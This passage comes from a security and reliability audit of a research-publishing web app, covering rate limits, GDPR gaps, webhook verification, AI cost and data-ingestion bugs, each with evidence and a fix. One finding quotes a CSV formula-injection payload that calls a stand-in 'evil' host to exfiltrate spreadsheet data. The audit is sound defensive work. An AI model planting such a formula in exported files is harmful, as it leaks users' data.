Evidence: `let baseQuery = db.select().from(blogArticles).$dynamic();`

**Fix:** Project list columns explicitly (id, slug, title, summary, imageUrl, articleType, publishedAt, isPublished, viewCount + metric fields); keep full rows only on the detail endpoints. Never select editorNotes on public routes.

### Chat sources' publishDate always empty — chat UI renders "(NaN)" year

`server/routes/chat-routes.ts:60` · medium (verifier suggests low) · effort: small · auditor: api-contract

Both /api/chat (line 60) and /api/advanced-chat (line 363) build sources with `study.publish_date || study.publication_date` — but studies come from studyService.getStudies(), whose Drizzle rows are camelCase (`publishDate`). Neither snake_case key exists, so publishDate is always "". ChatWidget.tsx:823 renders `new Date(source.publishDate).getFullYear()` → NaN, so every chat answer's Sources panel shows "Authors (NaN)". Server-internal snake/camel drift surfacing straight into the public UI.

Evidence: `publishDate: study.publish_date || study.publication_date || "",`

**Fix:** Use `study.publishDate || study.journalPublishDate || ""` in both source mappers; client-side, guard the year render when publishDate is falsy.

### Chat endpoints block up to 60s with no streaming

`server/routes/chat-routes.ts:173` · medium · effort: medium · auditor: ai-cost

POST /api/chat and /api/advanced-chat (chat-routes.ts:173, 339) call ai.generateText with maxTokens 1000/1500 and return a single JSON blob. Users see nothing until the full Sonnet completion finishes (typically 10-30s, up to the 60s per-request timeout), and any proxy/client timeout wastes the entire paid generation. The provider wrapper has no streaming path at all, so the flagship user-facing AI feature cannot stream.

Evidence: `const response = await ai.generateText(systemPrompt, userPrompt, { maxTokens: 1000, temperature: 0.7 });`

**Fix:** Add an SSE streaming variant to ai-provider (claude.messages.stream + finalMessage) and stream /api/chat responses; keep the JSON path as fallback for non-streaming clients.

### Unauthenticated, unthrottled proxies to third-party research APIs (Consensus, CrossRef, Europe PMC)

`server/routes/consensus-routes.ts:31` · medium · effort: small · auditor: security-routes

GET /api/consensus/search (Consensus API — metered/paid), GET /api/crossref/search (crossref-routes.ts:15), and GET /api/europepmc/search plus /doi//pmid//pmcid lookups (europepmc-routes.ts:17) are public with no rate limiter: app.ts mounts them (lines 593-595) without any limiter and none is applied in-router. Anyone can burn upstream quota/credits or get the server's IP banned by the upstream. The July audit added limits to NL-search/trends AI endpoints but these external-API GETs were missed.

Evidence: `app.use(europePmcRoutes);
app.use("/api/crossref", crossRefRoutes);
app.use("/api/consensus", consensusRoutes);`

**Fix:** Apply searchRateLimiter (or a dedicated external-API limiter) to these mounts in app.ts; consider requireAdmin on the search endpoints since their only client is the admin import UI.

### Unauthenticated /api/consensus/search: unbounded external-API spend and unbounded cache Map

`server/routes/consensus-routes.ts:31` · medium · effort: small · auditor: ai-cost

GET /api/consensus/search has no auth and no rate limiter and forwards arbitrary query strings to the paid Consensus API. Each unique query is a cache miss, so a visitor can generate unbounded external API spend, and every result is inserted into the module-level Map (consensus-api.ts:73) which is never evicted except lazily on read after 24h — unique-query floods grow server memory without bound.

Evidence: `router.get("/search", async (req, res) => { const result = await searchHydrogenPapers(query, ...) }); const cache = new Map<string, CacheEntry<any>>();`

**Fix:** Apply searchRateLimiter (or aiSearchRateLimiter) to the route; cap the cache with LRU eviction or a max-entries sweep; optionally restrict queries to configured hydrogen topics.

### Contact messages (name/email/phone) stored forever with no deletion path or retention limit

`server/routes/contact-routes.ts:63` · medium (verifier suggests low) · effort: small · auditor: gap

POST /api/contact inserts name, email, and message (with phone concatenated into the message text) into contact_messages. The only other route is an admin GET (limit 100). There is no DELETE route, no retention job, and account deletion does not touch this table, so an erasure request for contact-form PII cannot be honored through the application. Folding phone into the message text also makes selective redaction impossible.

Evidence: `await db.insert(contactMessages).values({ name, email, message: ...${message}${parsed.data.phone ? \n\nPhone: ... : ""} });`

**Fix:** Add an admin DELETE /api/contact/:id route and a scheduled purge (e.g. rows older than 12-24 months); store phone in its own column. Document the retention period in the privacy policy.

### Unauthenticated /api/analytics/batch-track allows unbounded DB write amplification and userId spoofing

`server/routes/content-analytics-routes.ts:341` · medium · effort: small · auditor: security-routes

batch-track accepts an events array with no length cap and inserts each event in a loop; a single 2 MB body can carry tens of thousands of events, and at 100 req/min (generalApiRateLimiter) an anonymous client can force millions of analytics rows per hour. Body-supplied userId also overrides the session (userId: validatedData.userId || req.session?.userId), letting anyone attribute fake views/engagement to arbitrary users. The router is additionally double-mounted under /api/studies via studies-controller.ts:19.

Evidence: `const events = req.body.events; ... for (const event of events) { ... await contentAnalyticsService.trackView({`

**Fix:** Cap events per request (e.g. 50) and reject oversized batches; ignore body userId when a session exists (use req.session.userId only); drop or dedupe the second mount inside the studies controller.

### [known] exceljs 4.4.0 ships vulnerable uuid; parses admin-uploaded XLSX files

`server/routes/import-routes.ts:3` · medium (verifier suggests low) · effort: small · auditor: deps-build

Re-verified still open: exceljs (last release 2024-12, slow maintenance) pins uuid <11.1.1 (GHSA-w5hq-g745-h8pq, moderate, missing buffer bounds check). It parses admin-uploaded workbook files server-side (workbook.xlsx.readFile on multer uploads), so untrusted-file parsing runs through a stale dependency tree. `npm audit fix --force` would downgrade to exceljs 3.4.0 — do not do that.

Evidence: `audit: "uuid <11.1.1 ... node_modules/exceljs/node_modules/uuid — exceljs >=3.5.0 depends on vulnerable versions"; import-routes.ts:365 await workbook.xlsx.readFile(filePath)`

**Fix:** Short-term: add package.json "overrides": {"exceljs": {"uuid": "^11.1.1"}}. Longer-term: the import routes already accept CSV via csv-parse — prefer CSV-only import, or migrate XLSX parsing to the maintained `read-excel-file/node`.

### Multi-format HTML export interpolates externally-ingested content unescaped into a text/html response

`server/routes/multi-format-routes.ts:628` · medium (verifier suggests low) · effort: small · auditor: security-input

generateHtmlExport builds an HTML document by string-interpolating content fields (title, podcastIntro, podcastScript, Q&A question/answer, newsletterHtml) with no escaping, then serves it as Content-Type text/html. These fields derive from AI generation over study abstracts/titles ingested from CrossRef/PubMed (untrusted external data). A poisoned study field yields script execution when the exported file is opened. Content-Disposition: attachment reduces but does not eliminate reachability.

Evidence: `<h1>${content.title}</h1> ... ${content.newsletterHtml || ""} interpolated then res.send(htmlContent) with Content-Type text/html`

**Fix:** HTML-escape every interpolated field (reuse escapeHtml from utils/html-safety.ts); pass newsletterHtml through sanitizeArticleHtml (DOMPurify) instead of embedding raw.

### Unbounded limit params let one request fetch entire tables

`server/routes/multi-format-routes.ts:258` · medium · effort: small · auditor: routes-utils

GET /api/multi-format (mounted without auth, app.ts:587) accepts any limit — ?limit=1000000 selects the whole table — and its count query selects every row's id and uses countResult.length (line 284-289) instead of COUNT(*), scanning the full table on every page view. Same unbounded pattern: trends-routes.ts:436 (.limit(parseInt(limit)) — NaN and unbounded), auth-routes.ts:629, content-enrichment-routes.ts:30, blog-recommendation-routes.ts:20, doi-enhancer-routes.ts:18/51 (body limit unclamped).

Evidence: `const limit = parseInt(req.query.limit as string) || 20; ... const countResult = await db.select({ count: multiFormatContent.id })`

**Fix:** Clamp limit (e.g. Math.min(100, Math.max(1, ...))) at each listed site and use db.select({ count: count() }) for the multi-format total.

### CSV export has no formula-injection guard (Excel/Sheets DDE risk)

`server/routes/proxy-routes.ts:1474` · medium (verifier suggests low) · effort: small · auditor: gap

csvEscape only quotes fields containing comma/quote/newline; it never neutralizes leading =, +, -, @ or tab. Title/authors/journal/results_short come from third-party ingestion (CrossRef/PubMed) and AI enhancement. A study title like '=HYPERLINK("http://evil/?"&A1)' is emitted verbatim into the downloaded CSV; when a user opens it in Excel/Sheets, the formula executes and can exfiltrate data or trigger DDE prompts.

Evidence: `if (str.includes(",") || str.includes('"') || str.includes("\n") || str.includes("\r")) { return "${str.replace(/"/g, '""')}"; } return str;`

**Fix:** In csvEscape, when the string starts with =, +, -, @, tab, or CR, prefix with a single quote (or a space) before the existing quoting logic, per OWASP CSV-injection guidance.

### No caching on any proxy route; every storefront hit runs 6+ sequential DB queries

`server/routes/proxy-routes.ts:478` · medium · effort: medium · auditor: gap

No route sets Cache-Control (grep confirms zero occurrences in the file). The main page awaits six sequential pool.query round-trips per request — count, page rows, per-study conditions, full condition list, a full-table stats aggregate, and condition count — even though the last three are identical for every visitor. /sitemap.xml selects every study row per hit. This is public echowater.com storefront + crawler traffic; the 60 req/min per-IP limiter doesn't help against crawler fleets, so Postgres absorbs the full load.

Evidence: `const countRows = await executeRawQuery(countQuery, params); ... const allConditions = await executeRawQuery(SELECT slug, name FROM health_conditions... (sequential awaits, lines 479-528; no Cache-Control anywhere)`

**Fix:** Set Cache-Control (e.g. public, max-age=300, stale-while-revalidate) so Shopify/CDN caches proxy responses; memoize the static queries (condition list, stats, sitemap) in a short-TTL in-process cache; run the main-page queries via Promise.all as /stats already does.

### Slugless studies get links to /study/<id> which always 404 (route matches slug only)

`server/routes/proxy-routes.ts:350` · medium · effort: small · auditor: gap

renderStudyCard, related-studies (line 807) and the embed widget (line 1324) build hrefs from `study.slug || study.id`, but GET /study/:slug queries only `WHERE s.slug = $1` (line 629). studies.slug is nullable in shared/schema.ts, and the sitemap explicitly filters `slug IS NOT NULL AND slug != ''` (line 1224), confirming null-slug rows are expected. Every card for such a study is a guaranteed 404 broken link on the echowater.com storefront.

Evidence: `const slug = study.slug || study.id; ... href="/tools/hydrogen-research/study/${escapeAttr(slug)}" — but route: SELECT s.* FROM studies s WHERE s.slug = $1`

**Fix:** Either exclude null/empty-slug studies from list, related, and embed queries (matching the sitemap filter), or make /study/:slug fall back to an id lookup when the param is numeric.

### Sitemap index references /proxy/sitemap.xml which is HMAC-gated (401) and lists cross-host echowater.com URLs

`server/routes/seo-routes.ts:154` · medium · effort: small · auditor: gap

sitemap-index.xml advertises ${SITE_URL}/proxy/sitemap.xml. In production, /proxy is mounted behind shopifyProxyAuth (app.ts:412) which rejects unsigned requests with 401 when SHOPIFY_APP_SECRET is set — only /proxy/embed/* is exempt — so Googlebot cannot fetch it. Even if fetched, it lists URLs under BASE_URL = https://echowater.com/tools/hydrogen-research (proxy-routes.ts:11); cross-host URLs in a sitemap hosted on hydrogenstudies.com are invalid per the sitemap protocol and are ignored, producing persistent "couldn't fetch" / invalid-URL errors on the index in GSC.

Evidence: `<loc>${SITE_URL}/proxy/sitemap.xml</loc> ... app.use("/proxy", shopifyProxyAuth, ...)`

**Fix:** Remove the /proxy/sitemap.xml entry from the sitemap index; the echowater proxy site should reference its own sitemap via its own robots.txt or GSC property.

### sitemap-categories.xml generates condition URLs from the categories table but pages render from health_conditions

`server/routes/seo-routes.ts:355` · medium · effort: small · auditor: gap

The categories sitemap slugifies categories.name into /explore-by-condition/<slug> URLs, but the crawler-facing renderer resolves those slugs against the separate health_conditions table (seo-body-renderer.ts:446-450) and returns null on a miss — which, per finding 2, serves a blank 200 page. Any category whose slugified name doesn't exactly match a health_conditions.slug puts a thin/empty page into the submitted sitemap. Additionally lastmod is always today's date, causing perpetual lastmod churn Google learns to distrust.

Evidence: `const slug = c.name.toLowerCase()... from(categories); vs renderer: FROM health_conditions WHERE slug = ${slug}`

**Fix:** Generate this sitemap from health_conditions.slug (the table the renderer validates against), and use a real content timestamp or omit lastmod.

### Shopify webhook HMAC verification is skipped entirely when secret env var is missing — prod guard is dead code

`server/routes/shopify-webhook-routes.ts:74` · medium · effort: small · auditor: services-r-z

verifyShopifyWebhook contains a production fail-closed branch (reject when SHOPIFY_WEBHOOK_SECRET unset), but all three handlers gate the entire verification block on `if (process.env.SHOPIFY_WEBHOOK_SECRET)`, so that branch is unreachable. If the secret is unset in production, unauthenticated POSTs to /api/webhooks/shopify/customer-created create customer accounts for arbitrary emails. The intended fail-closed design silently fails open.

Evidence: `if (process.env.SHOPIFY_WEBHOOK_SECRET) { ... if (!verifyShopifyWebhook(rawBody, hmacHeader)) ... }`

**Fix:** Call verifyShopifyWebhook unconditionally in all three handlers (it already handles the missing-secret dev/prod cases), returning 401 on false.

### GDPR data export omits userEngagement, searchQueries, and chatFeedback keyed to the user

`server/routes/user-dashboard-routes.ts:294` · medium · effort: small · auditor: gap

GET /api/me/data-export returns user, preferences, studyInteractions, readingHistory, searchHistory, auditLogs — but user_engagement (schema.ts:1756, per-action behavioral rows with userId), search_queries (schema.ts:1533), and chat_feedback (schema.ts:1193) all carry userId and are excluded, so a subject-access response is incomplete. Deletion at least anonymizes these via FK set-null, but access under Art. 15 does not surface them.

Evidence: `const exportData = { exportedAt..., user, preferences, studyInteractions, readingHistory, searchHistory, auditLogs };`

**Fix:** Add userEngagement, searchQueries, and chatFeedback (where userId matches) to the export payload; keep field names aligned with the schema so future user-keyed tables are added alongside.

### generateText silently returns truncated output when max_tokens is hit

`server/services/ai-provider.ts:215` · medium · effort: small · auditor: ai-cost

generateTextWithAnthropic returns textBlock.text without ever checking response.stop_reason. When a response hits the max_tokens cap (e.g. blog content at maxTokens 2000-4096 in blog-generator-enhanced.ts:330 and blog-routes.ts:1406), the mid-sentence truncated article is returned as success and can be stored/published. generateJSON callers instead get a confusing 'AI returned invalid JSON' error rather than a truncation diagnosis. stop_reason is only surfaced in the no-text-block error path.

Evidence: `const textBlock = response.content.find(...); if (!textBlock) { throw ... } return textBlock.text; // stop_reason never checked on success`

**Fix:** After extracting the text block, check response.stop_reason === "max_tokens": throw (or at minimum logger.warn with caller/model) so long-form callers can retry with a higher cap instead of persisting truncated content.

### Auto-update notifications attribute every impacted item to the first recent study

`server/services/auto-update-detector.ts:320` · medium · effort: small · auditor: services-a-e

processUpdateChecks sets `const triggerStudy = triggerStudies[0]` for ALL checks, so every notification's triggerContentId points at the first study in the batch regardless of which study actually caused it. The inline comment admits 'Simplified - should match properly'. Editors see wrong provenance for update suggestions.

Evidence: `const triggerStudy = triggerStudies[0]; // Simplified - should match properly`

**Fix:** Carry the triggering studyId on each UpdateCheck when it is created in findImpactedContent, and use that here instead of triggerStudies[0].

### Blog worker cancel is resurrected as 'paused', and pause/cancel/overlap guards are in-process only

`server/services/blog-generation-worker.ts:273` · medium · effort: medium · auditor: reliability-ops

cancelJob writes status='cancelled' and sets the module-level shouldStop flag (lines 113-130). The processing loop only checks shouldStop, and its stop branch unconditionally writes status='paused' (lines 273-287) — overwriting the cancellation, so a cancelled job becomes resumable 'paused'. Worse, isProcessing/currentJobId/shouldStop are module variables with no advisory lock: a second Railway instance (or rolling-deploy overlap) can startJob the same jobId concurrently (duplicate AI spend; the per-article dedupe check races), and pause/cancel signals can't reach a job running on another instance.

Evidence: `if (shouldStop) { await db.update(blogGenerationJobs).set({ status: "paused", ...`

**Fix:** In the shouldStop branch, re-read the job's DB status and preserve 'cancelled' (write 'paused' only if still 'running'). Wrap processJob in withAdvisoryLock(`blog-job:${jobId}`), and have the loop periodically re-read DB status so cancellation works cross-instance.

### findStudyByDoi uses exact DOI equality, missing case/prefix-normalized internal citation links

`server/services/citation-network-builder.ts:99` · medium · effort: small · auditor: services-a-e

Citation matching resolves internal studies with `eq(studies.doi, doi)` — exact string match. DOIs from CrossRef/Europe PMC and stored DOIs frequently differ in case or carry a doi.org/dx.doi.org prefix (dedup-service normalizes these; this does not). Legitimate internal citations are therefore stored as external references, understating the internal citation graph.

Evidence: `where: eq(studies.doi, doi) (l.99-103); no LOWER()/prefix-strip, unlike dedup-service normalizeDoi`

**Fix:** Match on the same normalized form used elsewhere: LOWER(REGEXP_REPLACE(doi,'^https?://(dx\.)?doi\.org/','','i')) on both sides.

### Consensus API in-memory cache is unbounded and keyed by raw public user queries

`server/services/consensus-api.ts:73` · medium (verifier suggests low) · effort: small · auditor: reliability-ops

cache is a module-level Map with 24h TTL, no size cap, and lazy eviction only — an expired entry is deleted solely if the exact same key is read again (getFromCache lines 80-88); setCache (90-92) never sweeps or evicts. Keys embed the raw query string, and the public GET /api/unified-search?includeExternal=true path (unified-search-routes.ts:71-86) writes one entry (a papers array, multiple KB) per unique query. Rate limiting slows but doesn't bound growth: unique-query traffic or crawler/abuse steadily grows the heap for the life of the process.

Evidence: `const cache = new Map<string, CacheEntry<any>>(); ... function setCache<T>(key, data, queryHash) { cache.set(key, { data, timestamp: Date.now(), queryHash }); }`

**Fix:** Cap the Map (LRU, e.g. 500 entries, evicting oldest on insert like seo-bot-middleware's botHtmlCache), or add a periodic sweep deleting entries older than CACHE_TTL_MS.

### Opus used for per-study single-abstract extraction (cheap-tier task)

`server/services/consensus-api.ts:222` · medium (verifier suggests low) · effort: small · auditor: ai-cost

summarizeSingleStudy sends one abstract for structured JSON extraction using MODELS.OPUS ($5/$25 per MTok) with maxTokens 1000. The project's own tiering runs identical per-study extraction on Haiku ($1/$5) elsewhere (study-summary-enrichment.ts:244, h2-field-enrichment.ts:165) and reserves Opus for cross-paper synthesis. This is a ~5-25x cost overpay per call for a task the codebase already handles on the cheap tier. Admin-gated, so bounded, but wasteful.

Evidence: `const text = await ai.generateText("", prompt, { model: MODELS.OPUS, maxTokens: 1000, ... caller: "ConsensusApi.summarizeSingleStudy" });`

**Fix:** Switch summarizeSingleStudy to MODELS.HAIKU (or MODELS.SONNET if quality demands); keep Opus only for synthesizeTopicEvidence/generateBlogOutline which aggregate many papers.

### Waterfall 'summaries' step enriches an arbitrary study, not the study it is processing

`server/services/content-generation-worker.ts:390` · medium · effort: medium · auditor: services-a-e

The summaries step calls enrichStudySummaries(1) to fill plainSummary/keyFinding for studyId. But enrichStudySummaries selects candidates by `keyFinding IS NULL AND abstract IS NOT NULL LIMIT 1` with no studyId filter and no ORDER BY, so it enriches whatever row Postgres returns first — often a different study. The worker then marks studyId's 'summaries' step complete, so the target study may never get its plainSummary/keyFinding.

Evidence: `await enrichStudySummaries(1); // Process just 1 study (this one should be the candidate) — selection is unbounded LIMIT 1, no id filter`

**Fix:** Add a studyId-targeted enrichment function (WHERE id = studyId) instead of relying on enrichStudySummaries picking the right candidate.

### Tag generation parses raw model output with no code-fence stripping, silently dropping tags

`server/services/content-generation-worker.ts:456` · medium (verifier suggests low) · effort: small · auditor: services-a-e

The tags step calls ai.generateText (which, unlike ai.generateJSON, does NOT strip markdown fences) and then JSON.parse(text). Haiku often wraps arrays in ```json fences, so JSON.parse throws, the error is swallowed as 'non-fatal', and the study gets no tags — while the step is still marked complete, so it never retries.

Evidence: `const tags = JSON.parse(text); on ai.generateText output; catch logs Tag generation failed ... nice-to-have`

**Fix:** Use ai.generateJSON here, or strip ```json fences before JSON.parse; consider validating and retrying rather than silently skipping.

### GA4 runReport has no offset pagination — 90-day backfill silently truncates at 100k rows

`server/services/ga4-service.ts:283` · medium (verifier suggests low) · effort: small · auditor: services-g-r

fetchPageMetrics and fetchSearchTerms issue a single runReport for the whole date range with `limit: ROW_LIMIT_PER_REPORT` (100000) and never pass an offset or check the API's rowCount. The first-run 90-day backfill of (date, pagePath) rows exceeding 100k is silently truncated, and the sync run is still recorded as 'success' — the admin analytics dashboard under-reports without any signal.

Evidence: `limit: ROW_LIMIT_PER_REPORT,
    keepEmptyRows: false,
  });`

**Fix:** Loop with the offset parameter until returned rows < limit (or use response rowCount), mirroring gsc-service's startRow paging; alternatively pull day-by-day like GSC does.

### GA4 sync lacks the cross-process advisory lock that GSC sync has — manual admin trigger can double-run

`server/services/ga4-service.ts:356` · medium (verifier suggests low) · effort: small · auditor: reliability-ops

syncSearchConsole wraps its impl in withAdvisoryLock("gsc-sync") specifically to cover the manual admin route that bypasses the scheduler's job:gsc-sync lock (gsc-service.ts:287-309). syncGa4 has only the in-process ga4SyncInFlight boolean; its own comment admits "a multi-instance deployment would need a Postgres advisory lock". The admin route (admin-ga4-routes.ts:177 await syncGa4()) can run concurrently with the scheduler's sync on another instance or during rolling-deploy overlap: duplicate GA4 API pulls, duplicate ga4_sync_runs rows, redundant upserts.

Evidence: `In-process guard only; a multi-instance deployment would need a Postgres advisory lock for cross-process exclusion. */ let ga4SyncInFlight = false;`

**Fix:** Mirror gsc-service: return await withAdvisoryLock("ga4-sync", () => syncGa4Impl()) inside syncGa4, mapping the null (lock-held) result to skipped: "another instance is syncing".

### H2 enrichment re-selects studies where extraction returned null, contradicting its own no-reprocess guard

`server/services/h2-field-enrichment.ts:191` · medium (verifier suggests low) · effort: small · auditor: services-g-r

The candidate query selects `h2DeliveryMethod IS NULL` (line 100). The code comments 'Always set h2DeliveryMethod even if null, so we don't reprocess this study' — but writing NULL leaves the row matching IS NULL, so studies where Claude cannot determine a delivery method are re-selected on every run. With an unordered `.limit(batchSize)`, the same null-result studies occupy batch slots repeatedly, burning AI calls and stalling enrichment of the rest of the corpus.

Evidence: `if (updates.h2DeliveryMethod === undefined) {
    updates.h2DeliveryMethod = null;
  }`

**Fix:** Use a sentinel value (e.g. 'unknown' or 'none') instead of NULL when extraction yields nothing, or add an h2EnrichedAt timestamp and filter on it; exclude previously-attempted rows from the candidate query.

### Weekly link-building job only ever processes the 200 lowest-id studies/blogs

`server/services/internal-linking-engine.ts:229` · medium · effort: medium · auditor: services-g-r

buildAllStudyLinks/buildAllBlogLinks use `.orderBy(id).limit(batchSize)` with no offset or cursor, so the weekly scheduler job (batchSize 200, job-scheduler.ts:1225-1226) re-scans the same oldest 200 rows forever; newer studies and blogs never get smart links. Additionally generateBlogLinks' "related blogs" query (lines 145-158) has no topic filter, so every blog links to the same 5 lowest-id published blogs.

Evidence: `.from(studies)
    .orderBy(studies.id)
    .limit(batchSize);`

**Fix:** Paginate with a keyset cursor (WHERE id > lastProcessed, persisted between runs) or order by least-recently-linked; add a topic/studyId filter to the related-blogs query.

### Metadata freshness job clobbers precise publishDate with year-only 'YYYY-01-01' from CrossRef

`server/services/job-scheduler.ts:1515` · medium · effort: small · auditor: services-g-r

runMetadataFreshnessJob pads missing month/day to '01' and then overwrites studies.publishDate whenever the padded string differs from the stored value. CrossRef frequently returns year-only or year-month date-parts, so a stored precise date like 2020-06-15 gets silently replaced by 2020-01-01 on the weekly pass. Schema also documents publishDate as 'Date when study was added to our site' (shared/schema.ts:277), so the overwrite conflates two different semantics.

Evidence: `const month = dateParts.length >= 2 ? String(dateParts[1]).padStart(2, "0") : "01";
... if (study.publishDate && fetchedDate !== study.publishDate)`

**Fix:** Only update when CrossRef supplies full year-month-day precision (dateParts.length === 3), write to journalPublishDate rather than publishDate, and skip when the stored date's year already matches a year-only response.

### Scheduler job failures never reach Sentry — reportError catch blocks are unreachable dead code

`server/services/job-scheduler.ts:158` · medium · effort: small · auditor: reliability-ops

withTimeout never rejects: on job throw it logs via logger.error and resolves null (lines 158-164). The try/catch blocks around each withTimeout call that invoke reportError (e.g. lines 314-318 for discovery, 336-340, 403-407, 487-491, 506-510) can therefore never fire — Sentry gets nothing. Only GSC/GA4 syncs report, because their inner functions call reportError themselves (lines 925-926, 956-957). The other ~20 background jobs (retraction, scoring, blog generation, content queue, Shopify reconcile, etc.) fail silently as far as Sentry is concerned.

Evidence: `}).catch((error) => { ... logger.error(Job failed: ${jobName}, error, "JobScheduler"); resolve(null); });`

**Fix:** Call reportError(error, { tags: { job: jobName } }) inside withTimeout's .catch (and on timeout), then delete the unreachable per-job catch reportError blocks.

### Keyword monitor check-then-insert race creates duplicate monitor_results across parallel sources

`server/services/keyword-monitor-service.ts:345` · medium · effort: small · auditor: services-g-r

saveSearchResults dedupes by SELECTing monitor_results by DOI then INSERTing, with all per-row inserts fired in parallel (results.map of async fns, line 332) and all sources also searched in parallel (Promise.all, line 245). The in-memory processedDOIs Set is per-source-batch only, and monitor_results has no unique constraint on doi (shared/schema.ts:1292-1308). Two sources returning the same paper concurrently both pass the SELECT check and insert duplicate pending-review rows.

Evidence: `const [existing] = await db.select().from(monitorResults).where(eq(monitorResults.doi, result.doi));`

**Fix:** Add a partial unique index on monitor_results(doi) WHERE doi IS NOT NULL and switch the insert to onConflictDoNothing; or serialize saves through a shared cross-source Set and sequential inserts.

### Klaviyo email lookup double-encodes the address, and list-add never records subscribe consent

`server/services/klaviyo-api.ts:94` · medium · effort: small · auditor: services-g-r

The fallback profile lookup embeds encodeURIComponent(email) INSIDE the filter string, so Klaviyo compares against the literal 'user%40example.com' and never matches — 'Could not find or create profile' on the 409-without-meta path. Separately, subscribeToNewsletter adds the profile via /lists/{id}/relationships/profiles/, which sets list membership but not email marketing consent; profiles created this way can remain 'never subscribed' and receive no campaigns.

Evidence: `${KLAVIYO_API_URL}/profiles/?filter=equals(email,"${encodeURIComponent(email.toLowerCase().trim())}")`

**Fix:** Build the filter raw (equals(email,"addr")) and encode the whole query-param value once via URLSearchParams. Use the profile-subscription-bulk-create-jobs endpoint to subscribe with explicit email consent instead of the bare relationships add.

### medRxiv/bioRxiv search reads only the first 100 records of a 90-day window — cursor never advanced

`server/services/preprint-api.ts:94` · medium · effort: small · auditor: services-g-r

The api.biorxiv.org details endpoint returns fixed 100-record pages (oldest first) with a cursor. fetchRecentPreprints is always called with cursor 0 and its pageSize argument is never used, and messages[0].total is ignored. medRxiv posts hundreds of preprints per day, so keyword filtering only ever sees roughly the first day of the 90-day window — the scheduled discovery source silently returns stale or empty results.

Evidence: `const data = await fetchRecentPreprints("medrxiv", fromDate, toDate, 0, 100);`

**Fix:** Loop the cursor in steps of 100 until messages[0].total is exhausted (with a sane page cap), or narrow the date window per page; apply keyword filtering per page.

### bioRxiv/medRxiv per-preprint CC license field is discarded before storage

`server/services/preprint-api.ts:112` · medium (verifier suggests low) · effort: medium · auditor: gap

The bioRxiv/medRxiv API response includes a per-item license field (declared at line 41), but the mapped PreprintResult drops it. Preprint licenses vary per paper — many are CC-BY-NC-ND or 'all rights reserved (no reuse)' — yet ingested preprints flow into the studies pipeline where abstracts are republished and AI-derived summaries/blogs (derivative works) are generated for commercial use, which NC/ND terms forbid. There is no way to filter after ingestion because the license was never stored.

Evidence: `interface field license: string; exists, but results map returns only title/abstract/authors/.../version — no license`

**Fix:** Propagate item.license into the result and the studies/monitor_results schema; gate AI-derivative generation and full-abstract republication on permissive licenses (CC-BY, CC0).

### PubMed enricher writes to nonexistent columns — PMID, year, author-split silently lost

`server/services/pubmed-enricher.ts:281` · medium · effort: small · auditor: services-g-r

mapPubMedDataToStudy populates keys `year`, `first_author`, `last_author`, `pmid`, and `updatedAt` and passes them to db.update(studies).set(). None of these exist on the studies table (it has publishYear, lastModified, and no pmid/first_author columns — confirmed in shared/schema.ts), so Drizzle drops them and the enrichment 'success' message is partly a lie: the PMID and year are never persisted, and the update can degenerate to an empty SET if only phantom keys are present.

Evidence: `enrichedData.first_author = authorNames[0];
... enrichedData.pmid = pubmedData.pmid;
  enrichedData.updatedAt = new Date();`

**Fix:** Map to real columns: publishYear instead of year, lastModified instead of updatedAt; drop first_author/last_author or add the columns; store PMID in an existing field (url/doi) or add a pmid column.

### NCBI E-utilities etiquette gaps and no rate limiting/backoff in shared HTTP helper

`server/services/pubmed-enricher.ts:148` · medium · effort: medium · auditor: gap

No E-utilities caller sends the NCBI-recommended tool/email params; pubmed-enricher sends a literal empty api_key= param when PUBMED_API_KEY is unset (axios serializes the empty string), and each enrichment makes a 3-request burst (esearch+efetch+esummary). server/utils/http.ts externalApi sets only timeout/body caps — no per-host rate limiting, no 429/Retry-After backoff — while retraction-check (2 calls/study, 500ms apart), discovery, and keyword-monitor all share one Railway egress IP. Sustained 429s or an NCBI block would silently break enrichment and retraction monitoring.

Evidence: `const apiKey = process.env.PUBMED_API_KEY || ""; params = { ..., api_key: apiKey }; http.ts: axios.create({ timeout, maxContentLength, maxBodyLength }) — nothing else`

**Fix:** Add tool/email params to all eutils calls; omit api_key when empty; add a small per-host limiter (3 req/s NCBI without key) plus 429 Retry-After backoff in externalApi.

### Corrected / expression-of-concern studies re-flagged every run — duplicate critical notifications

`server/services/retraction-monitor.ts:277` · medium · effort: small · auditor: services-r-z

The candidate query only excludes peerReviewStatus IN ('retracted','withdrawn'). Studies already marked 'corrected' or 'expression_of_concern' stay in the batch, CrossRef returns the same status again, and handleCorrection/handleExpressionOfConcern insert fresh high-priority updateNotifications rows for every impacted blog on every run — unbounded duplicate notification spam in the admin queue.

Evidence: `sql${studies.peerReviewStatus} NOT IN ('retracted', 'withdrawn')`

**Fix:** Exclude 'corrected' and 'expression_of_concern' from the candidate query (or skip handlers when peerReviewStatus already equals the detected status).

### Copyrighted article figures hotlinked/downloaded and republished as study images

`server/services/semantic-scholar-api.ts:151` · medium · effort: small · auditor: gap

extractStudyFromSemanticScholar sets studies.imageUrl to paperData.figures[0].url (hotlinking Semantic Scholar-hosted figure assets), and content-enrichment.ts:188/227 downloads Europe PMC firstFigureUrl to local storage via downloadImage and serves it publicly. Journal figures are copyrighted artwork; even open-access CC-ND licenses prohibit reuse out of context, and NC licenses prohibit this commercial use. No license check precedes either path.

Evidence: `imageUrl: paperData.figures && paperData.figures.length > 0 ? paperData.figures[0].url : null; content-enrichment: imageSrc = europePmcData.firstFigureUrl → downloadImage(imageSrc, studyId)`

**Fix:** Stop ingesting article figures; rely on the existing AI image generator for study imagery. Backfill: null out imageUrl values whose source was a figure URL.

### No public attribution for Semantic Scholar (mandatory) or Europe PMC/bioRxiv (requested)

`server/services/semantic-scholar-api.ts:12` · medium · effort: small · auditor: gap

Semantic Scholar's API license requires attribution (e.g. 'Data provided by Semantic Scholar' with link) when its data is displayed; Europe PMC and bioRxiv/medRxiv terms request source acknowledgment. Grep of client/src shows source names only in admin components (SemanticScholarSearch.tsx, EuropePmcSearch.tsx); public study pages show only a doi.org citation link. sourcePlatform is stored per study but never rendered as attribution on public pages.

Evidence: `// Using public Semantic Scholar API without authentication — and no client/src public page renders any 'Data provided by...' attribution`

**Fix:** Render a per-study source attribution line (from sourcePlatform) with link-back on study pages, including the Semantic Scholar-required wording; register for an S2 API key which also grants a dedicated rate limit.

### Semantic search fires up to 200 uncached OpenAI embedding calls per query, with collision-prone cache key

`server/services/semantic-search-engine.ts:215` · medium · effort: large · auditor: services-r-z

